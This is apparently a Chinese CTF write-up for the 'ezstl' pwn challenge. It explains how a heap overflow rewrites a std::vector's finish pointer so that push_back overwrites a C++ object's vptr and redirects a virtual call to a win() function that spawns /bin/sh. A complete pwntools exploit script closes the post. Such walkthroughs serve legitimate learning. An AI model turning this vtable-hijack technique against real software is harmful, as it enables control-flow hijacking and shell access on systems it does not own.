---
title: '另类的STL利用的堆题'
published: 2026-09-15
description: '啊啊啊啊啊事情好多啊'
author: 'dxfaker'
image: '/images/post/26.9.15.png'
tags: ['pwn','wp']
category: 'wp'
toc: true
---

# 一天写一题，我速度真够吧快!.jpg

艾斯比吧

# ezstl

```c
 checksec pwn
[*] '/mnt/d/ctf/flag/pwn/moectf/ezstl/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

哎呀，骇死我力！

不管，先shift+f12

找到后门

```c
unsigned __int64 sub_1329()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("admin badge");
  system("/bin/sh");
  return v1 - __readfsqword(0x28u);
}
```

再看pwn.cpp

 ```c
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <vector>

class Badge {
public:
    virtual void show()
    {
        puts("guest badge");
    }
};

extern "C" void win()
{
    puts("admin badge");
    system("/bin/sh");
}

struct Profile {
    char name[0x30];
    std::vector<void *> styles;
    Badge badge;
};

struct StyleData {
    void *slot[1];
};

struct HeapData {
    Profile profile;
    StyleData custom_style;
};

void setup()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(60);
}

unsigned long read_ulong()
{
    char buf[0x40] = {};
    size_t i = 0;

    while (i + 1 < sizeof(buf)) {
        char ch = 0;
        ssize_t n = read(0, &ch, 1);
        if (n <= 0) {
            exit(0);
        }
        if (ch == '\n') {
            break;
        }
        buf[i++] = ch;
    }

    return strtoul(buf, NULL, 0);
}

void add_style(Profile *profile, StyleData *style)
{
    profile->styles.push_back(style);
}

void check_badge(Badge *badge)
{
    badge->show();
}

int main()
{
    setup();

    HeapData *data = new HeapData;
    Profile *profile = &data->profile;
    StyleData *custom_style = &data->custom_style;

    puts("== pwn ==");
    printf("profile: %p\n", profile);

    printf("name: ");
    if (read(0, profile->name, 0x48) <= 0) {
        exit(0);
    }

    add_style(profile, custom_style);

    printf("win: %p\n", (void *)win);
    printf("style data: ");
    custom_style->slot[0] = (void *)read_ulong();

    puts("checking...");
    check_badge(&profile->badge);

    _exit(0);
}

 ```

不过也还好，profile的真实地址是直接给的，利用IDA看偏移就可以算基址

这个题溢出还是挺明显的,但这个题的指针是虚指针

~~两亿年没用过C艹以至于我已经忘记vector调用了，所以先恶补了一下~~

```c++
struct Profile {
    char name[0x30];              // 第 1 个成员
    std::vector<void *> styles;   // 第 2 个成员
    Badge badge;                  // 第 3 个成员（Badge，有 virtual → 带 vptr）
};

```

>vector 对象本身 = 一个 3 指针的控制块，固定 0x18（24 字节）

现在就是覆盖的事情了,0x30+0x18正好是0x48,还能顺便覆盖个vector

那覆盖掉vector对我有什么好处呢

那就得讲解一下vector了

```c
vector 对象布局（在 Profile 的 0x30~0x47）：
  _M_start         (0x30)  8B
  _M_finish        (0x38)  8B
  _M_end_of_storage(0x40)  8B
  合计 = 0x18

```

push_back

```cpp
void push_back(const T& x) {
    if (_M_finish != _M_end_of_storage) {   // 还有空位？
        *_M_finish = x;                     //   ① 写到 _M_finish 指向的地址
        ++_M_finish;                        //   ② 写指针后移
    } else {
        _M_realloc_insert(end(), x);        //   ③ 满了 → 重分配
    }
}

```

```
_M_start         → 缓冲区第一个元素
_M_finish        → 最后一个元素“之后”（下一个要写的位置）
_M_end_of_storage → 已分配容量的“末尾”（再写就超了）
```

push_back写入的地址就是_M_finish当前指向的地方，然后_M_end_of_storage视情况是否分配内存

那你想要跳转就得有执行或者指针跳转是吧，Profile溢出之后正好只能到达vector，且vector指针再怎么传入也不能执行跳转操作，那就得考虑另辟蹊径，通过观察也就引出了另外一个指针

```c++
class Badge {
public:
    virtual void show()        // ← 这个 virtual 就是关键
    {
        puts("guest badge");
    }
};

```

~~我是懒鬼~~

>C++ 规则：只要一个类声明了 virtual 成员函数（或继承了带虚函数的基类），编译器就会给这个类的每个对象自动插入一根隐藏的指针——虚指针（vptr），并额外生成一张“虚表（vtable）”。
>
>源码里你看不到 vptr 的声明——它是编译器偷偷加的，不在你写的代码里。
>触发它存在的唯一条件就是 virtual。如果 show() 不带 virtual，Badge 就是个空类（0 字节，没有 vptr），badge->show() 也会是直接调用（编译期绑定），那就没有可劫持的间接跳转了。
>
>虚表（vtable）：每个类一张，存 show 等虚函数的地址。
>虚指针（vptr）：每个对象一根，指向自己类的虚表。Badge 没有其它数据成员，所以 vptr 就是它的全部内容，且位于对象最开头（偏移 0）。

Badge 只有一根 vptr、没有别的数据成员，所以 vptr 是对象的最开头（偏移 0）

所以badge的起始位置也就是指针的起始位置

那现在有指针了，那就可以利用这个指针进行跳转了

由于最后一步有写入

```cpp
 check_badge(&profile->badge);
```

回顾他的结构

```cpp
void check_badge(Badge *badge)
{
    badge->show();
}
```

badge->show();等价于

```cpp
vtable = *(badge);            
func   = *(vtable + 0);       
func(badge);                
```

现在只需要想办法写入到这个虚指针就好了

那我们该怎么在payload里写呢

那么就是在填充字节后设置他的地址就好了

由于第一次打印会泄露出他的地址，所以要好好接住.jpg(我操，恶俗啊)

神必小约定:

1. _M_start 改成任意值

2. finish必须指向profile+0x48
3. M_end_of_storage必须 > _M_finish（如 profile+0x50），否则走扩容分支，原语失效

第一轮把指针指向好了，第二轮就可以输入win了

下面是exp

```python
from pwn import *

context.binary = './pwn'
p = process(['./libs/ld-linux-x86-64.so.2', '--library-path', './libs', './pwn'])

p.recvuntil(b'profile: ')
profile = int(p.recvline().strip(), 16)  

payload = b'A' * 0x30                   
payload += p64(profile + 0x48)          
payload += p64(profile + 0x48)        
payload += p64(profile + 0x50)           

p.send(payload)

p.recvuntil(b'win: ')
win = int(p.recvline().strip(), 16)
p.recvuntil(b'style data: ')
p.sendline(str(win).encode())            

p.interactive()                

```

初学好难搞，以至于将近一天我才好好参悟完一题(实则聊天看网课去了)













